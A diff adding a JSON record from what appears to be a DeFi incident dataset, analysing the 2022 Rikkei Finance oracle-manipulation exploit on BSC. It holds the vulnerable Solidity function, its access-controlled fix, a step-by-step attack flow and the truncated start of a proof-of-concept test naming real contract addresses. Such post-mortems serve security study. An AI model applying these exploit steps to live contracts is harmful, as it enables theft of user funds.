@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-04-15_Rikkei_OracleManipulationBorrow",
+ "source_file": "2022/2022-04-15_Rikkei_OracleManipulationBorrow.md",
+ "title": "Rikkei Finance — Oracle Manipulation Over-Collateralized Borrowing Analysis",
+ "date": "2022-04-15",
+ "protocol": "Rikkei Finance",
+ "chain": "BSC",
+ "loss_raw": "~$1,100,000 (USDC)",
+ "loss_usd": 1100000.0,
+ "root_cause": "The `setOracleData()` function had no access control, allowing anyone to arbitrarily set the BNB price oracle, enabling the attacker to inflate collateral value and over-borrow",
+ "attack_tx": "Block 16,956,474",
+ "vulnerable_contract": "SimplePriceOracle 0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable SimplePriceOracle.setOracleData() (actual bug)\ncontract SimplePriceOracle {\n    mapping(address => address) public oracleData;\n\n    //",
+  "❌ No access control — anyone can change the oracle price source\n    function setOracleData(address token, address source) external {\n        // No onlyOwner!\n        oracleData[token] = source;\n    }\n\n    function getUnderlyingPrice(address cToken) external view returns (uint256) {\n        address token = ICToken(cToken).underlying();\n        address source = oracleData[token];\n        // If source is a fake feed deployed by the attacker, arbitrary price can be returned\n        return IPriceFeed(source).latestAnswer();\n    }\n}\n\n//",
+  "// ❌ Root cause: `setOracleData()` function has no access control, allowing anyone to arbitrarily set the BNB price oracle, enabling the attacker to inflate collateral value and over-borrow\n    function setOracleData(address rToken, oracleChainlink _oracle) external {  // ❌ Vulnerability\n        oracleData[rToken] = _oracle;\n    }"
+ ],
+ "code_after": [
+  "✅ Correct pattern\ncontract SimplePriceOracleFixed {\n    address public owner;\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"not owner\");\n        _;\n    }\n\n    //",
+  "✅ Only owner can change oracle source\n    function setOracleData(address token, address source) external onlyOwner {\n        //"
+ ],
+ "steps": [
+  "→ BNB collateral value inflated infinitely",
+  "→ Borrow entire USDC balance with inflated collateral succeeds"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Mint rBNB (small amount of BNB)\n    │       BNB approve(rBNB)\n    │       rBNB.mint(100,000,000,000,000 wei) // 0.0001 BNB\n    │       Cointroller.enterMarkets([rBNB])\n    │\n    ├─[2] ⚡ Call setOracleData() (no access control)\n    │       SimplePriceOracle.setOracleData(\n    │           BNB_address,\n    │           attacker's fake feed address  // 1 BNB = 1,000,000 USD\n    │       )\n    │       → BNB collateral value inflated infinitely\n    │\n    ├─[3] rUSDC.borrow(getCash())\n    │       Collateral value = 0.0001 BNB × 1,000,000 USD/BNB = $100\n    │       → Borrow entire USDC balance with inflated collateral succeeds\n    │\n    ├─[4] Call setOracleData() again\n    │       Restore BNB oracle to original Chainlink address\n    │       (cover tracks)\n    │\n    └─[5] Tra",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IRToken {\n    function mint(uint256 mintAmount) external returns (uint256);\n    function borrow(uint256 borrowAmount) external returns (uint256);\n    function getCash() external view returns (uint256);\n}\n\ninterface ICointroller {\n    function enterMarkets(address[] calldata rTokens) external returns (uint256[] memory);\n}\n\ninterface ISimplePriceOracle {\n    // ⚡ Vulnerable function: no access control\n    function setOracleData(address token, address source) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 USDC  = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);\n    IRToken rBNB = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);\n    IRToken rUSDC = IRToken(0x916e87d16B2F3E097"
+ ]
+}
